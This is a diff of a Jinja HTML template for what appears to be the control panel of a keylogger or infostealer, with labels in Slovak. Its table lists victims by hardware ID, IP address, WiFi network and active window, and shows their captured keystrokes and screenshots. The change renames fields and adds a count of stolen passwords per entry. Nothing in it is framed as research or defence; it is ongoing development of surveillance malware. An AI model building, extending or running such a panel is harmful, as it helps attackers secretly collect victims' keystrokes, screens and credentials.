@@ -8,10 +8,10 @@
         body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
         h2 { text-align: center; font-size: 2.5em; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; margin-bottom: 20px; }
         table { border-collapse: collapse; width: 100%; border: 1px solid #00ff00; box-shadow: 0 0 15px #00ff00aa; }
-        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; vertical-align: top; } /* Zmena na vertical-align: top pre lepšie zarovnanie pri viacriadkovom obsahu */
+        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; vertical-align: top; } 
         th { background: #003300; text-transform: uppercase; letter-spacing: 1px; }
         pre { white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; color: #0f0; max-height: 100px; overflow-y: auto; }
-        img { max-height: 120px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; cursor: pointer; } /* Pridaný cursor: pointer */
+        img { max-height: 120px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; cursor: pointer; } 
         tr:hover { background-color: #002200; }
         .no-data { color: #888; font-style: italic; }
 
@@ -22,9 +22,9 @@
         /* Scroll bar for large data */
         tbody { display: block; max-height: 70vh; overflow-y: auto; }
         thead, tbody tr { display: table; width: 100%; table-layout: fixed; }
-        th:nth-child(6), td:nth-child(6) { width: 25%; } /* Širší stĺpec pre klávesy */
-        th:nth-child(7), td:nth-child(7) { width: 10%; } /* Širší stĺpec pre screenshot */
-        th:nth-child(8), td:nth-child(8) { width: 10%; } /* Stĺpec pre akcie */
+        th:nth-child(6), td:nth-child(6) { width: 25%; } 
+        th:nth-child(7), td:nth-child(7) { width: 10%; } 
+        th:nth-child(8), td:nth-child(8) { width: 10%; } 
     </style>
 </head>
 <body>
@@ -46,20 +46,15 @@
         <tbody>
         {% for entry in data %}
             <tr>
-                <!-- Kľúčová zmena: 'timestamp' -> 'received_at' a formátovanie času -->
                 <td>{{ entry.received_at[:19].replace('T', ' ') }}</td>
-                <td>{{ entry.user_id }}</td>
+                <td>{{ entry.user or 'N/A' }}</td>
                 <td>{{ entry.hwid[:10] }}...</td>
-                <td>{{ entry.ip_address }}</td>
+                <td>{{ entry.ip or 'N/A' }}</td>
                 <td>{{ entry.active_window or 'N/A' }}</td>
-                
-                <!-- NOVÉ: Zobrazenie WiFi SSID -->
                 <td>{{ entry.wifi_ssid or '<span class="no-data">N/A</span>'|safe }}</td>
-
                 <td><pre>{{ entry.keys or '<span class="no-data">Žiadne</span>'|safe }}</pre></td>
                 <td>
                     {% if entry.screenshot %}
-                        <!-- Odkaz na detail, kde je väčší screenshot -->
                         <a href="{{ url_for('detail', index=loop.index0) }}">
                             <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
                         </a>
@@ -67,10 +62,11 @@
                         <span class="no-data">Žiadny</span>
                     {% endif %}
                 </td>
-                
-                <!-- NOVÉ: Stĺpec pre akcie, najmä pre detail -->
                 <td>
                     <a href="{{ url_for('detail', index=loop.index0) }}" style="color: #00ff00; text-decoration: underline;">Zobraziť detail</a>
+                    {% if entry.stolen_data %}
+                        <br><span style="color: #ff00ff;">[{{ entry.stolen_data|length }} hesiel]</span>
+                    {% endif %}
                 </td>
             </tr>
         {% endfor %}
